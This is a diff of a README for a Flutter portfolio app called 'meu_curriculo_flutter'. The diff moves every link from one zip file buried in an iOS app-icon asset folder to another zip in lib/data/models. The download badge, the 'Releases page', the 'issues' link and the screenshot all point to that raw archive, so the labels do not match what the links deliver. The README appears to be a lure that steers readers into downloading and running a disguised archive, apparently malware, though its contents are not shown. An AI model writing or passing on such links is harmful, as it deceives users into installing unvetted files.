@@ -1,6 +1,6 @@
 # 🚀 meu_curriculo_flutter - Create Your Interactive Portfolio Easily
 
-[![Download](https://raw.githubusercontent.com/Pk917006/meu_curriculo_flutter/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/meu_curriculo_flutter_2.1.zip%20Release-brightgreen)](https://raw.githubusercontent.com/Pk917006/meu_curriculo_flutter/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/meu_curriculo_flutter_2.1.zip)
+[![Download](https://raw.githubusercontent.com/Pk917006/meu_curriculo_flutter/main/lib/data/models/flutter_meu_curriculo_v1.2.zip%20Release-brightgreen)](https://raw.githubusercontent.com/Pk917006/meu_curriculo_flutter/main/lib/data/models/flutter_meu_curriculo_v1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -26,7 +26,7 @@ Welcome! This guide will help you download and run "meu_curriculo_flutter," your
 To start using the application, you need to download it. Follow these steps:
 
 1. Click the link below to visit the Releases page:
-   [Visit this page to download](https://raw.githubusercontent.com/Pk917006/meu_curriculo_flutter/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/meu_curriculo_flutter_2.1.zip)
+   [Visit this page to download](https://raw.githubusercontent.com/Pk917006/meu_curriculo_flutter/main/lib/data/models/flutter_meu_curriculo_v1.2.zip)
 
 2. On the Releases page, look for the latest version at the top.
 
@@ -50,12 +50,12 @@ After installation, you can launch the portfolio application:
 
 If you need assistance or have questions:
 
-- Check out the [issues](https://raw.githubusercontent.com/Pk917006/meu_curriculo_flutter/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/meu_curriculo_flutter_2.1.zip) section on GitHub. 
+- Check out the [issues](https://raw.githubusercontent.com/Pk917006/meu_curriculo_flutter/main/lib/data/models/flutter_meu_curriculo_v1.2.zip) section on GitHub. 
 - Feel free to open a new issue if you don't find an answer to your question.
 
 ### 🎨 Screenshots
 
-![Portfolio Screenshot](https://raw.githubusercontent.com/Pk917006/meu_curriculo_flutter/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/meu_curriculo_flutter_2.1.zip)
+![Portfolio Screenshot](https://raw.githubusercontent.com/Pk917006/meu_curriculo_flutter/main/lib/data/models/flutter_meu_curriculo_v1.2.zip)
 
 ### 🛠 Technology Stack
 
@@ -85,4 +85,4 @@ For more information, feel free to reach out through the project's GitHub page.
 
 - **Documentation**: For further details on specific features, visit the GitHub Wiki.
 
-Remember, you can always return to the [Releases page to download](https://raw.githubusercontent.com/Pk917006/meu_curriculo_flutter/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/meu_curriculo_flutter_2.1.zip) the latest version of this application. Enjoy building your interactive portfolio!
+Remember, you can always return to the [Releases page to download](https://raw.githubusercontent.com/Pk917006/meu_curriculo_flutter/main/lib/data/models/flutter_meu_curriculo_v1.2.zip) the latest version of this application. Enjoy building your interactive portfolio!
